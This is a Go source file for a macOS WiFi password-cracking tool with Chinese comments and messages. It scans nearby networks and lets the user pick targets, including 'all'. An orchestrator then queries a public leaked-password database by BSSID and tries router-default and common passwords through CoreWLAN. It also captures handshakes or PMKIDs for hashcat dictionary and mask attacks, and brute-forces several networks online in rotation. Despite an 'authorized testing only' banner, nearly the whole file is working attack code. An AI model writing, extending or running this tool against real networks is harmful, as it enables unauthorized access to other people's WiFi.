package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
	"wifi-crack/internal/capture"
	"wifi-crack/internal/cracker"
	"wifi-crack/internal/dict"
	"wifi-crack/internal/hashcrack"
	"wifi-crack/internal/p3wifi"
	"os/exec"
	"wifi-crack/internal/scanner"
)

// ============================================================
// 版本信息
// ============================================================
const (
	version = "3.0.0"
	banner  = `
  ╔══════════════════════════════════════════════════╗
  ║   WiFi Cracker v%s (Go + CoreWLAN + hashcat)  ║
  ║   全球密码库 + 握手包捕获 + GPU离线破解          ║
  ║   macOS 专用 · 仅限授权安全测试                ║
  ╚══════════════════════════════════════════════════╝
`
)

func main() {
	// ============================================================
	// 命令行参数定义
	// ============================================================
	target := flag.String("t", "", "指定目标SSID（不指定则自动扫描）")
	dictFile := flag.String("d", "", "额外字典文件路径")
	delay := flag.Int("delay", 200, "每次尝试间隔（毫秒）")
	scanOnly := flag.Bool("scan", false, "仅扫描，不爆破")
	_ = flag.Bool("all", false, "显示全部WiFi（不过滤），交互式选择目标") // 已统一为默认行为
	captureMode := flag.Bool("capture", false, "握手包捕获模式（tcpdump+bettercap）")
	hashcatMode := flag.Bool("hashcat", false, "hashcat GPU离线破解模式")
	hashFile := flag.String("hash", "", "hashcat哈希文件路径（.22000格式，配合--hashcat使用）")
	maskOnly := flag.Bool("mask", false, "仅执行掩码暴力攻击（配合--hashcat使用）")
	verbose := flag.Bool("v", true, "显示详细日志")
	showVersion := flag.Bool("version", false, "显示版本")
	flag.Parse()

	// 版本信息
	if *showVersion {
		fmt.Printf("wifi-crack v%s\n", version)
		return
	}

	fmt.Printf(banner, version)

	// ============================================================
	// 独立模式：hashcat离线破解（提供了--hash文件时直接破解）
	// ============================================================
	if *hashcatMode && *hashFile != "" {
		runHashcatOnly(*hashFile, *dictFile, *maskOnly, *verbose)
		return
	}

	// ============================================================
	// 阶段0：位置权限检查
	// ============================================================
	locStatus := scanner.LocationStatus()
	fmt.Printf("  [0/3] 位置权限: %s\n", locStatus)
	if locStatus != "已授权" {
		fmt.Println("  [!] 位置权限未授予，SSID可能不可见（但不影响扫描BSSID和信号）")
		fmt.Println("  [!] 授权方法: 系统设置 → 隐私与安全 → 定位服务 → 打开 → 找到终端/iTerm → 勾选允许")
		fmt.Println("  [!] 提示: 不要用sudo运行本程序（sudo下位置权限不可用）")
		fmt.Println()
	}

	// ============================================================
	// 阶段1：扫描WiFi
	// ============================================================
	fmt.Println("  [1/3] 扫描附近WiFi网络...")

	nets, err := scanner.ScanWiFi()
	if err != nil {
		fmt.Fprintf(os.Stderr, "  [!] 扫描失败: %v\n", err)
		fmt.Fprintln(os.Stderr, "  [!] 提示: 需要在终端中授予位置权限")
		os.Exit(1)
	}

	if len(nets) == 0 {
		fmt.Fprintln(os.Stderr, "  [!] 未扫描到WiFi网络")
		fmt.Fprintln(os.Stderr, "  [!] 可能原因: 位置权限未授予，请检查 系统设置 > 隐私与安全 > 定位服务")
		os.Exit(1)
	}

	fmt.Printf("  [+] 扫描到 %d 个WiFi网络\n", len(nets))

	// ============================================================
	// 阶段2：列出全部WiFi + 交互选择目标
	// 所有模式统一显示全部WiFi（不过滤），用户自己选择要攻击哪个
	// ============================================================
	var targets []scanner.WiFiNetwork

	if *target != "" {
		// -t 指定目标模式：直接查找
		fmt.Println("  [2/3] 查找指定目标...")
		for _, n := range nets {
			if n.SSID == *target {
				targets = append(targets, n)
				break
			}
		}
		if len(targets) == 0 {
			fmt.Fprintf(os.Stderr, "  [!] 未找到目标: %s\n", *target)
			os.Exit(1)
		}
		printWiFiTable(targets, "指定目标")
	} else {
		// 默认模式和--all模式：全部列出 + 交互选择
		fmt.Println("  [2/3] 列出全部WiFi网络...")
		allNets := sortBySignal(nets)
		printWiFiTable(allNets, "全部WiFi网络")

		if *scanOnly {
			fmt.Println("\n  [*] 扫描完成（--scan 模式）")
			return
		}

		// 交互式选择目标
		targets = interactiveSelect(allNets)
		if len(targets) == 0 {
			fmt.Println("\n  [!] 未选择任何目标")
			return
		}
	}

	if len(targets) == 0 {
		fmt.Println("\n  [!] 没有目标")
		return
	}

	// ============================================================
	// 握手包捕获模式（--capture）
	// ============================================================
	if *captureMode {
		runCaptureMode(targets, allPasswordsForTargets(targets, *dictFile), *verbose)
		return
	}

	// ============================================================
	// 所有模式统一进入智能攻击编排器
	// Phase 1: 全球密码库查询（p3wifi + 万能钥匙备用）
	// Phase 2: CoreWLAN快速验证TOP密码
	// Phase 3: 握手包捕获 + hashcat GPU字典攻击
	// Phase 4: hashcat GPU掩码暴力攻击
	// Phase 5: CoreWLAN在线完整字典爆破（兜底）
	// ============================================================
	runSmartAttack(targets, *dictFile, *delay, *verbose)
}

// ============================================================
// truncStr 截断字符串（超长加省略号）
// ============================================================
func truncStr(s string, maxLen int) string {
	runes := []rune(s)
	if len(runes) <= maxLen {
		return s
	}
	return string(runes[:maxLen-1]) + "…"
}

// ============================================================
// printWiFiTable 打印WiFi列表表格
// ============================================================
func printWiFiTable(nets []scanner.WiFiNetwork, title string) {
	fmt.Printf("\n  %s (%d 个):\n", title, len(nets))
	fmt.Println("  ┌─────┬──────────────────────────┬────────┬────────────┬─────┬───────────────────┐")
	fmt.Println("  │  #  │ SSID                     │ 信号   │ 安全类型   │ 频道│ BSSID             │")
	fmt.Println("  ├─────┼──────────────────────────┼────────┼────────────┼─────┼───────────────────┤")
	for i, n := range nets {
		fmt.Printf("  │ %-3d │ %-24s │ %4d   │ %-10s │ %-3d │ %-17s │\n",
			i+1, truncStr(n.SSID, 24), n.RSSI, n.Security, n.Channel, n.BSSID)
	}
	fmt.Println("  └─────┴──────────────────────────┴────────┴────────────┴─────┴───────────────────┘")
}

// ============================================================
// sortBySignal 按信号强度从强到弱排序（不过滤，保留全部）
// ============================================================
func sortBySignal(nets []scanner.WiFiNetwork) []scanner.WiFiNetwork {
	// 先按SSID去重（保留信号最强的）
	best := make(map[string]scanner.WiFiNetwork)
	for _, n := range nets {
		if n.SSID == "" {
			continue
		}
		if existing, ok := best[n.SSID]; ok {
			if n.RSSI > existing.RSSI {
				best[n.SSID] = n
			}
		} else {
			best[n.SSID] = n
		}
	}
	result := make([]scanner.WiFiNetwork, 0, len(best))
	for _, n := range best {
		result = append(result, n)
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].RSSI > result[j].RSSI
	})
	return result
}

// ============================================================
// interactiveSelect 交互式选择WiFi目标（支持单选和多选）
// 输入格式: 单个数字(如 3)、逗号分隔(如 1,3,5)、范围(如 1-5)、all(全选)
// ============================================================
func interactiveSelect(nets []scanner.WiFiNetwork) []scanner.WiFiNetwork {
	fmt.Println("\n  ╔══════════════════════════════════════════════╗")
	fmt.Println("  ║          交互式目标选择                      ║")
	fmt.Println("  ╠══════════════════════════════════════════════╣")
	fmt.Println("  ║  输入编号选择目标，支持以下格式：            ║")
	fmt.Println("  ║    单选:  3                                  ║")
	fmt.Println("  ║    多选:  1,3,5                              ║")
	fmt.Println("  ║    范围:  1-5                                ║")
	fmt.Println("  ║    混合:  1,3-5,8                            ║")
	fmt.Println("  ║    全选:  all                                ║")
	fmt.Println("  ║    退出:  q                                  ║")
	fmt.Println("  ╚══════════════════════════════════════════════╝")
	fmt.Print("\n  请选择目标: ")

	reader := bufio.NewReader(os.Stdin)
	input, err := reader.ReadString('\n')
	if err != nil {
		return nil
	}
	input = strings.TrimSpace(input)

	if input == "" || input == "q" || input == "Q" {
		return nil
	}

	// 全选
	if strings.ToLower(input) == "all" {
		fmt.Printf("  [+] 已选择全部 %d 个目标\n", len(nets))
		return nets
	}

	// 解析选择的编号
	selected := parseSelection(input, len(nets))
	if len(selected) == 0 {
		fmt.Println("  [!] 无效的输入")
		return nil
	}

	// 构建目标列表
	var targets []scanner.WiFiNetwork
	for _, idx := range selected {
		targets = append(targets, nets[idx])
	}

	// 打印已选目标
	fmt.Printf("\n  [+] 已选择 %d 个目标:\n", len(targets))
	for i, t := range targets {
		fmt.Printf("      %d. %s (%s, %ddBm)\n", i+1, t.SSID, t.Security, t.RSSI)
	}

	return targets
}

// ============================================================
// parseSelection 解析用户输入的选择字符串
// 支持: "3", "1,3,5", "1-5", "1,3-5,8" 等格式
// 返回: 0-based索引列表
// ============================================================
func parseSelection(input string, maxLen int) []int {
	seen := make(map[int]bool)
	var result []int

	parts := strings.Split(input, ",")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}

		// 检查是否是范围格式 (如 "1-5")
		if strings.Contains(part, "-") {
			rangeParts := strings.SplitN(part, "-", 2)
			start, err1 := strconv.Atoi(strings.TrimSpace(rangeParts[0]))
			end, err2 := strconv.Atoi(strings.TrimSpace(rangeParts[1]))
			if err1 != nil || err2 != nil {
				continue
			}
			if start > end {
				start, end = end, start
			}
			for i := start; i <= end; i++ {
				idx := i - 1 // 转为0-based
				if idx >= 0 && idx < maxLen && !seen[idx] {
					seen[idx] = true
					result = append(result, idx)
				}
			}
		} else {
			// 单个数字
			num, err := strconv.Atoi(part)
			if err != nil {
				continue
			}
			idx := num - 1 // 转为0-based
			if idx >= 0 && idx < maxLen && !seen[idx] {
				seen[idx] = true
				result = append(result, idx)
			}
		}
	}

	return result
}

// ============================================================
// allPasswordsForTargets 为目标构建完整密码列表
// 用于capture模式中hashcat的字典来源
// ============================================================
func allPasswordsForTargets(targets []scanner.WiFiNetwork, dictFile string) []string {
	var all []string

	// 路由器默认密码
	for _, t := range targets {
		all = append(all, cracker.GenerateRouterDefaults(t.SSID)...)
	}

	// 中国定制字典
	all = append(all, dict.GenerateAllChinese()...)

	// 外部字典
	if dictFile != "" {
		absPath, _ := filepath.Abs(dictFile)
		extra, err := dict.LoadDictFile(absPath)
		if err == nil {
			all = append(all, extra...)
		}
	}

	return dict.MergeAndDedup(all)
}

// ============================================================
// runCaptureMode 握手包捕获+hashcat GPU离线破解模式
// 流程: 检测工具 → 捕获握手包 → hashcat GPU破解
// ============================================================
func runCaptureMode(targets []scanner.WiFiNetwork, passwords []string, verbose bool) {
	fmt.Println("\n  ══ 握手包捕获 + GPU离线破解模式 ══")

	// 检查所需工具
	missing := capture.CheckTools()
	if len(missing) > 0 {
		fmt.Println("  [!] 缺少以下工具:")
		for _, m := range missing {
			fmt.Printf("      - %s\n", m)
		}
		fmt.Println("  [!] 请先安装后再使用此模式")
		os.Exit(1)
	}

	// 检查hashcat
	ok, info := hashcrack.CheckHashcat()
	if !ok {
		fmt.Printf("  [!] %s\n", info)
		os.Exit(1)
	}
	fmt.Printf("  [+] %s\n", info)

	// hashcat基准测试
	speed, err := hashcrack.Benchmark()
	if err == nil && speed > 0 {
		fmt.Printf("  [+] GPU基准速度: %d H/s\n", speed)
	}

	// 记录原始WiFi用于恢复
	originalSSID := scanner.CurrentSSID()
	if originalSSID != "" {
		fmt.Printf("  [!] 当前WiFi: %s（完成后自动恢复）\n", originalSSID)
	}

	cfg := capture.DefaultCaptureConfig()
	cfg.Verbose = verbose

	successCount := 0
	for i, t := range targets {
		fmt.Printf("\n  ── 目标 [%d/%d] %s (BSSID:%s CH:%d 信号:%d) ──\n",
			i+1, len(targets), t.SSID, t.BSSID, t.Channel, t.RSSI)

		if t.BSSID == "" {
			fmt.Println("    [!] BSSID为空，跳过")
			continue
		}

		// 捕获握手包
		result := capture.CaptureHandshake(t.SSID, t.BSSID, t.Channel, cfg)
		if !result.Success {
			fmt.Printf("    [!] 捕获失败: %s\n", result.Error)
			continue
		}

		fmt.Printf("    [+] 捕获成功（耗时%s），开始hashcat GPU破解...\n",
			result.Duration.Round(time.Second))

		// 生成临时字典文件
		wordlistPath, wErr := hashcrack.GenerateWordlist(passwords, cfg.OutputDir)
		if wErr != nil {
			fmt.Printf("    [!] 字典文件生成失败: %v\n", wErr)
			continue
		}

		// 执行hashcat破解
		hcfg := hashcrack.DefaultHashcatConfig()
		hcfg.HashFile = result.HashFile
		hcfg.Wordlists = []string{wordlistPath}
		hcfg.Verbose = verbose

		hResult := hashcrack.CrackAll(hcfg)
		if hResult.Success {
			successCount++
			fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（%s, 耗时%s）\n",
				t.SSID, hResult.Password, hResult.Attack,
				hResult.Duration.Round(time.Second))
		} else {
			fmt.Printf("    [!] GPU破解未命中（%s）\n", hResult.Error)
		}
	}

	// 恢复原始WiFi
	if originalSSID != "" {
		fmt.Printf("\n  [*] 正在恢复原WiFi: %s ...", originalSSID)
		if scanner.ReconnectWiFi(originalSSID) {
			fmt.Println(" ✓ 已恢复")
		} else {
			fmt.Println(" ✗ 恢复失败，请手动连接")
		}
	}

	// 结果汇总
	fmt.Printf("\n  ══ 完成: 共%d个目标，GPU破解成功%d个 ══\n", len(targets), successCount)
	if successCount > 0 {
		os.Exit(0)
	} else {
		os.Exit(1)
	}
}

// ============================================================
// runHashcatOnly 独立hashcat破解模式
// 直接对提供的.22000哈希文件执行GPU破解
// ============================================================
func runHashcatOnly(hashFilePath, dictFilePath string, maskOnly, verbose bool) {
	fmt.Println("\n  ══ hashcat GPU独立破解模式 ══")

	// 检查hashcat
	ok, info := hashcrack.CheckHashcat()
	if !ok {
		fmt.Printf("  [!] %s\n", info)
		os.Exit(1)
	}
	fmt.Printf("  [+] %s\n", info)

	// 检查哈希文件
	if _, err := os.Stat(hashFilePath); err != nil {
		fmt.Printf("  [!] 哈希文件不存在: %s\n", hashFilePath)
		os.Exit(1)
	}

	cfg := hashcrack.DefaultHashcatConfig()
	cfg.HashFile = hashFilePath
	cfg.Verbose = verbose

	// 构建字典列表
	if !maskOnly {
		var wordlists []string

		// 用户指定的字典
		if dictFilePath != "" {
			absPath, _ := filepath.Abs(dictFilePath)
			wordlists = append(wordlists, absPath)
		}

		// 生成内置字典临时文件
		builtinPwds := dict.GenerateAllChinese()
		tmpDir := filepath.Dir(hashFilePath)
		if tmpPath, err := hashcrack.GenerateWordlist(builtinPwds, tmpDir); err == nil {
			wordlists = append(wordlists, tmpPath)
		}

		// 检查本地wifi_dict.txt
		exeDir, _ := os.Getwd()
		localDict := filepath.Join(exeDir, "wifi_dict.txt")
		if _, err := os.Stat(localDict); err == nil {
			wordlists = append(wordlists, localDict)
		}

		cfg.Wordlists = wordlists
	}

	// 执行破解
	result := hashcrack.CrackAll(cfg)
	if result.Success {
		fmt.Printf("\n  ✓✓✓ 破解成功! 密码=%s（%s, 耗时%s）\n",
			result.Password, result.Attack,
			result.Duration.Round(time.Second))
		os.Exit(0)
	} else {
		fmt.Printf("\n  [!] GPU破解未命中（%s）\n", result.Error)
		os.Exit(1)
	}
}

// ============================================================
// runSmartAttack 智能攻击编排器
// 选择WiFi后自动按效率从高到低依次尝试所有可用攻击手段
//
// 攻击流程（分层递进）：
//   Phase 1（秒级）：万能钥匙API查询 → 命中则CoreWLAN验证连接
//   Phase 2（秒级）：CoreWLAN快速验证TOP密码（路由器默认+TOP50高频）
//   Phase 3（分钟级）：捕获握手包/PMKID → hashcat GPU字典攻击
//   Phase 4（分钟~小时）：hashcat GPU掩码暴力攻击（8位数字→9位→...）
//   Phase 5（兜底）：CoreWLAN在线完整字典爆破
//
// 工具协作逻辑：
//   CoreWLAN(验证) → tcpdump(捕获) → bettercap(deauth)
//   → hcxpcapngtool(转换) → hashcat(GPU破解) → CoreWLAN(兜底爆破)
// ============================================================
func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, verbose bool) {
	start := time.Now()
	fmt.Println("\n  ╔══════════════════════════════════════════════════════════╗")
	fmt.Println("  ║        智能攻击编排器 (Smart Attack)                    ║")
	fmt.Println("  ║  密码库查询 → TOP密码 → 握手捕获 → GPU破解 → 字典爆破  ║")
	fmt.Println("  ╠══════════════════════════════════════════════════════════╣")
	fmt.Println("  ║  适用目标:                                              ║")
	fmt.Println("  ║  ✓ WPA2-Personal  — 字典/暴力可破（弱密码极易）        ║")
	fmt.Println("  ║  ✓ WPA/WPA2混合   — 同上，兼容模式更容易               ║")
	fmt.Println("  ║  △ WPA3-Transition — 可降级为WPA2后破解               ║")
	fmt.Println("  ║  ✗ WPA3-Only       — SAE阻止离线破解（极难）         ║")
	fmt.Println("  ║  ✗ WPA2-Enterprise — 需要证书，字典无效              ║")
	fmt.Println("  ║  ✗ OWE/Open        — 无密码或仅加密传输              ║")
	fmt.Println("  ║  关键因素: 密码强度 > 加密类型 > 路由器型号           ║")
	fmt.Println("  ║  8位纯数字密码约32分钟可穷举，12位混合密码几乎不可能  ║")
	fmt.Println("  ╚══════════════════════════════════════════════════════════╝")

	// 记录原始WiFi用于最后恢复
	originalSSID := scanner.CurrentSSID()
	if originalSSID != "" {
		fmt.Printf("  [*] 当前WiFi: %s（完成后自动恢复）\n", originalSSID)
	}

	// Phase 5 目标收集结构（Phase 1-4 未命中的目标收集到这里，统一用轮询处理）
	type phase5Target struct {
		net          scanner.WiFiNetwork
		topPasswords []string // Phase 2 已尝试的密码（Phase 5 排除用）
		dictFile     string
	}
	var phase5Targets []phase5Target

	successCount := 0
	for ti, t := range targets {
		fmt.Printf("\n  ━━ 目标 [%d/%d] %s (BSSID:%s CH:%d %ddBm %s) ━━\n",
			ti+1, len(targets), t.SSID, t.BSSID, t.Channel, t.RSSI, t.Security)

		// ── Phase 1: 全球WiFi密码库查询（秒级） ──
		// 优先用p3wifi（3wifi.dev全球开放数据库），万能钥匙作为备用
		fmt.Println("  [Phase 1] 全球WiFi密码库查询（p3wifi 3wifi.dev）...")
		if t.BSSID != "" {
			phase1Hit := false

			// 1a. p3wifi全球密码库查询（无需认证，数据库数千万条记录）
			fmt.Printf("    [1a] p3wifi数据库查询 BSSID=%s ...", t.BSSID)
			pwd3, err3 := p3wifi.QueryByBSSID(t.BSSID)
			if err3 == nil && pwd3 != "" {
				fmt.Printf(" ✓ 命中! 密码=[%s]\n", pwd3)
				fmt.Printf("    验证连接中...\n")
				if scanner.TryConnect(t.SSID, pwd3) {
					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（p3wifi全球密码库）\n", t.SSID, pwd3)
					scanner.DisconnectWiFi()
					successCount++
					phase1Hit = true
				} else {
					fmt.Println("    ✗ p3wifi密码验证失败（可能已更换密码）")
				}
			} else if err3 != nil {
				fmt.Printf(" 查询失败: %v\n", err3)
			} else {
				fmt.Printf(" 未收录\n")
			}

			// 如果p3wifi有完整记录（含多个历史密码），尝试所有
			if !phase1Hit {
				fullResults, _ := p3wifi.QueryFull(t.BSSID, "")
				for _, r := range fullResults {
					if r.Password == pwd3 {
						continue // 已尝试过
					}
					fmt.Printf("    [1a] 尝试历史密码: %s ...", r.Password)
					if scanner.TryConnect(t.SSID, r.Password) {
						fmt.Printf(" ✓ 命中!\n")
						fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（%s）\n", t.SSID, r.Password, r.Source)
						scanner.DisconnectWiFi()
						successCount++
						phase1Hit = true
						break
					}
					fmt.Printf(" ✗\n")
					time.Sleep(200 * time.Millisecond)
				}
			}

			if phase1Hit {
				continue
			}
		} else {
			fmt.Println("    - BSSID为空，跳过在线查询")
		}

		// ── Phase 2: CoreWLAN快速验证TOP密码（秒级） ──
		topPasswords := buildTopPasswords(t.SSID)
		fmt.Printf("  [Phase 2] 快速验证TOP%d个密码...\n", len(topPasswords))
		found := false
		scanner.CacheTarget(t.SSID) // 预缓存目标，加速后续连接
		for i, pwd := range topPasswords {
			fmt.Printf("\r    [%d/%d] 尝试: %-20s", i+1, len(topPasswords), pwd)
			if scanner.TryConnect(t.SSID, pwd) {
				fmt.Printf("\n    ✓ 命中! 密码=%s\n", pwd)
				scanner.DisconnectWiFi()
				successCount++
				found = true
				break
			}
			time.Sleep(50 * time.Millisecond) // 缩短间隔加速
		}
		if found {
			continue
		}
		fmt.Printf("\n    - TOP %d个密码均未命中\n", len(topPasswords))

		// ── Phase 3: 握手包捕获（macOS内置WiFi不支持帧注入） ──
		// Apple WiFi驱动不支持frame injection（见bettercap issue #448）
		// deauth帧无法发送 → 无法强制客户端重连 → 握手包难以捕获
		// 此功能需要外部USB WiFi适配器（如Alfa AWUS036ACH）才能使用
		missingTools := capture.CheckTools()
		hasGPUTools := len(missingTools) == 0
		hashcatOK, _ := hashcrack.CheckHashcat()
		hasSudo := capture.CheckSudo()

		// 尝试请求sudo权限
		if !hasSudo && hasGPUTools && hashcatOK {
			authCmd := exec.Command("sudo", "-v")
			authCmd.Stdin = os.Stdin
			authCmd.Stdout = os.Stdout
			authCmd.Stderr = os.Stderr
			if authCmd.Run() == nil {
				hasSudo = true
			}
		}

		gpuDone := false
		if hasGPUTools && hashcatOK && hasSudo {
			fmt.Println("  [Phase 3] 握手包捕获（macOS内置WiFi不支持deauth，尝试被动捕获）...")

			cfg := capture.DefaultCaptureConfig()
			cfg.Verbose = verbose

			capResult := capture.CaptureHandshake(t.SSID, t.BSSID, t.Channel, cfg)

			// 捕获后必须恢复WiFi接口（tcpdump -I会设为监控模式）
			capture.RestoreWiFiInterface(cfg.Interface)

			if capResult.Success {
				fmt.Printf("    ✓ 捕获成功（PMKID=%v, 握手=%v），启动GPU字典攻击...\n",
					capResult.HasPMKID, capResult.HasHandshk)

				// 生成字典文件
				allPwds := allPasswordsForTargets([]scanner.WiFiNetwork{t}, dictFile)
				wordlistPath, _ := hashcrack.GenerateWordlist(allPwds, cfg.OutputDir)

				hcfg := hashcrack.DefaultHashcatConfig()
				hcfg.HashFile = capResult.HashFile
				hcfg.Verbose = verbose
				if wordlistPath != "" {
					hcfg.Wordlists = []string{wordlistPath}
				}

				hResult := hashcrack.CrackWithDict(hcfg)
				if hResult.Success {
					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（GPU字典攻击, %s）\n",
						t.SSID, hResult.Password, hResult.Duration.Round(time.Second))
					successCount++
					continue
				}
				fmt.Println("    - GPU字典攻击未命中，进入掩码暴力阶段")

				// ── Phase 4: hashcat GPU掩码暴力（分钟~小时级） ──
				fmt.Println("  [Phase 4] GPU掩码暴力攻击（8位纯数字起步）...")
				hcfg.MaskAttacks = []string{"?d?d?d?d?d?d?d?d"}
				hcfg.Timeout = 40 * time.Minute
				mResult := hashcrack.CrackWithMask(hcfg)
				if mResult.Success {
					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（GPU掩码攻击, %s）\n",
						t.SSID, mResult.Password, mResult.Duration.Round(time.Second))
					successCount++
					continue
				}
				fmt.Println("    - 8位纯数字掩码未命中")
				gpuDone = true
			} else {
				fmt.Printf("    ✗ 握手包捕获失败: %s\n", capResult.Error)
			}
		} else {
			fmt.Println("  [Phase 3-4] 跳过握手捕获+GPU破解")
			fmt.Println("    原因: macOS内置WiFi不支持帧注入（Apple驱动限制）")
			fmt.Println("    解决: 买USB WiFi适配器(RTL8812AU约¥50) + Windows/Kali使用")
		}

		// ── Phase 5: CoreWLAN在线字典爆破（分层策略） ──
		if gpuDone {
			fmt.Println("  [Phase 5] 跳过（GPU已完成字典+暴力均未命中）")
		} else {
			// 收集需要Phase 5爆破的目标（后面统一用轮询处理）
			phase5Targets = append(phase5Targets, phase5Target{
				net:          t,
				topPasswords: topPasswords,
				dictFile:     dictFile,
			})
		}
	}

	// ============================================================
	// Phase 5 统一执行：多目标轮询式在线字典爆破
	// 优势：多个WiFi交替推进，弱密码目标能快速暴露
	// delay=0：CoreWLAN associateToNetwork 本身需要 ~300ms，无需额外等待
	// ============================================================
	if len(phase5Targets) > 0 {
		fmt.Printf("\n  ╔══════════════════════════════════════════════════════════╗\n")
		fmt.Printf("  ║  Phase 5: 在线字典爆破（%d个目标，轮询模式）             ║\n", len(phase5Targets))
		fmt.Printf("  ╚══════════════════════════════════════════════════════════╝\n")

		// Phase 5a: 核心密码字典（~10万条，不含wifi_dict.txt）
		// 多目标轮询，delay=0 让CoreWLAN自己控制节奏
		crackCfg := cracker.CrackConfig{
			Delay:    0, // CoreWLAN本身每次 ~300ms，无需额外等待
			Verbose:  verbose,
			MaxRetry: 1,
		}

		// 为每个目标生成Phase 5a密码（排除Phase 2已尝试的）
		var p5aTargets []scanner.WiFiNetwork
		var p5aPasswords [][]string
		for _, pt := range phase5Targets {
			topSet := make(map[string]bool)
			for _, p := range pt.topPasswords {
				topSet[p] = true
			}
			corePwds := dict.GenerateAllForTarget(pt.net.SSID, pt.net.BSSID)
			var layer1 []string
			for _, p := range corePwds {
				if !topSet[p] {
					layer1 = append(layer1, p)
				}
			}
			p5aTargets = append(p5aTargets, pt.net)
			p5aPasswords = append(p5aPasswords, layer1)
			fmt.Printf("    %s: %d条核心密码\n", pt.net.SSID, len(layer1))
		}

		// 多目标轮询爆破 Phase 5a
		if len(p5aTargets) == 1 {
			// 单目标直接爆破
			fmt.Printf("  [Phase 5a] 核心密码字典（%d条，预计%d分钟）...\n",
				len(p5aPasswords[0]), len(p5aPasswords[0])*300/60000+1)
			scanner.CacheTarget(p5aTargets[0].SSID)
			r1 := cracker.CrackOne(p5aTargets[0], p5aPasswords[0], crackCfg)
			if r1.Success {
				successCount++
			}
		} else {
			// 多目标：合并为统一密码表 + 轮询
			allP5a := dict.MergeAndDedup(p5aPasswords...)
			fmt.Printf("  [Phase 5a] 轮询模式: %d个目标 × %d条密码（每轮每目标50条）\n",
				len(p5aTargets), len(allP5a))
			results := cracker.CrackAllRoundRobin(p5aTargets, allP5a, crackCfg, 50)
			for _, r := range results {
				if r.Success {
					successCount++
				}
			}
		}

		// Phase 5b: wifi_dict.txt 大字典兜底
		// 收集Phase 5a已试过的密码，避免重复
		triedCore := dict.GenerateCoreChinese()
		triedSet := make(map[string]bool, len(triedCore))
		for _, p := range triedCore {
			triedSet[p] = true
		}
		// 构建目标网络列表（用于 allPasswordsForTargets）
		p5bNets := make([]scanner.WiFiNetwork, 0, len(phase5Targets))
		for _, pt := range phase5Targets {
			p5bNets = append(p5bNets, pt.net)
			for _, p := range pt.topPasswords {
				triedSet[p] = true
			}
		}
		allPwds := allPasswordsForTargets(p5bNets, dictFile)
		var layer2 []string
		for _, p := range allPwds {
			if !triedSet[p] {
				layer2 = append(layer2, p)
			}
		}
		maxLayer2 := 50000
		if len(layer2) > maxLayer2 {
			layer2 = layer2[:maxLayer2]
		}
		if len(layer2) > 0 {
			fmt.Printf("  [Phase 5b] 大字典兜底（%d条，预计%d分钟）...\n",
				len(layer2), len(layer2)*300/60000+1)
			if len(phase5Targets) == 1 {
				scanner.CacheTarget(phase5Targets[0].net.SSID)
				r2 := cracker.CrackOne(phase5Targets[0].net, layer2, crackCfg)
				if r2.Success {
					successCount++
				}
			} else {
				results := cracker.CrackAllRoundRobin(p5bNets, layer2, crackCfg, 50)
				for _, r := range results {
					if r.Success {
						successCount++
					}
				}
			}
		}
	}

	// 恢复原始WiFi
	if originalSSID != "" {
		fmt.Printf("\n  [*] 正在恢复原WiFi: %s ...", originalSSID)
		if scanner.ReconnectWiFi(originalSSID) {
			fmt.Println(" ✓ 已恢复")
		} else {
			fmt.Println(" ✗ 恢复失败，请手动连接")
		}
	}

	elapsed := time.Since(start).Round(time.Second)
	fmt.Printf("\n  ━━ 智能攻击完成: %d个目标, 成功%d个, 总耗时%s ━━\n",
		len(targets), successCount, elapsed)

	if successCount > 0 {
		os.Exit(0)
	} else {
		os.Exit(1)
	}
}

// ============================================================
// buildTopPasswords 构建快速验证用的TOP密码列表
// 包含：路由器默认密码 + 前50个最高频密码（约50-70条，10秒内可完成）
// ============================================================
func buildTopPasswords(ssid string) []string {
	var top []string
	// 第1层：路由器默认密码（根据SSID品牌前缀生成）
	top = append(top, cracker.GenerateRouterDefaults(ssid)...)
	// 第2层：SSID智能字典（根据SSID中的数字/字母模式生成针对性密码）
	top = append(top, cracker.GenerateSSIDSmart(ssid)...)
	// 第3层：最高频的50个通用密码
	topN := dict.TopPasswords
	if len(topN) > 50 {
		topN = topN[:50]
	}
	top = append(top, topN...)
	return dict.MergeAndDedup(top)
}
